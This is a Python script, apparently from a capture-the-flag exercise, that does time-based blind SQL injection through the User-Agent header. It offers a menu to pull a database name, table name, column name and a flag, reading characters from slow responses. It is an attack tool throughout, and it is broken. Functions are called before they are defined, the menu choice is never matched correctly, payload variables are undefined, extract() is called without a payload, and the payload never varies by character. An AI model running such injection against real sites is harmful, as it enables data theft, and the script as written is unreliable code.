import requests
import time 

def get_input():
    while True:

        menu = "what would you like to extract ?\n[1] Extract the database name\n[2] Extract the Table name\n[3] Extract the column name\n[4] Extract the flag\n"
        choice= input(menu + "enter : ")
        try :
            int(choice)
            start(choice=choice)
            return
        except ValueError:
            print("invalid input! try a number between 1-4 ...")

get_input()

def start(choice):
    match choice:
        case 1 :
            payload = payload_1
        case 2 :
            payload = payload_2
        case 3 :
            payload = payload_3
        case 4 :
            payload = payload_4
        case default: 
            return


def extract(url, payload, timout=12):
    result=""
    possible_chars="abcdefghijklmnopqrstuvwxyz1234567890_"
    headers={}
    proxies={}


    for i in range (1,40):
        found_char=False
        for char in possible_chars:
            headers["User-Agent"]=payload


            start_time=time.time()
            requests.get(url, headers=headers, proxies=proxies, verify=False)
            response_time=time.time()-start_time



            if response_time >=timout:
                result+=char
                print (f"Found Char {i}: {char}")
                found_char=True
                break
        if not found_char:
            print("Extraction Complete.")
            break
    return result

url=""
final_name=extract(url)
print(final_name)
